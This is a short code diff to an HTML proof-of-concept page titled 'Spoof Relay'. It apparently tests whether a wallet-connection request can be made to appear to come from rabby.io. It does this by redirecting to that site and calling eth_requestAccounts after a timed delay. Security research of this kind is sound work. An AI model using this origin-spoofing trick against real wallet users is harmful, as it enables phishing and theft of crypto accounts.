@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Spoof Relay</title>
+  <title>Spoof Relay - poc2: 200</title>
 </head>
 <body>
   <h2>Connecting Wallet…</h2>
@@ -15,7 +15,7 @@
         return;
       }
       try {
-        window.open('https://rabby.io');
+        window.location = 'https://rabby.io';
         setTimeout(async () => {
           const accountsPromise = window.ethereum.request({
             method: 'eth_requestAccounts'
@@ -28,7 +28,7 @@
             document.getElementById('msg').innerText = 'Connection failed';
             console.error(err);
           }
-        }, 100);
+        }, 200);
       } catch (err) {
         document.getElementById('msg').innerText = 'Unexpected error';
         console.error(err);
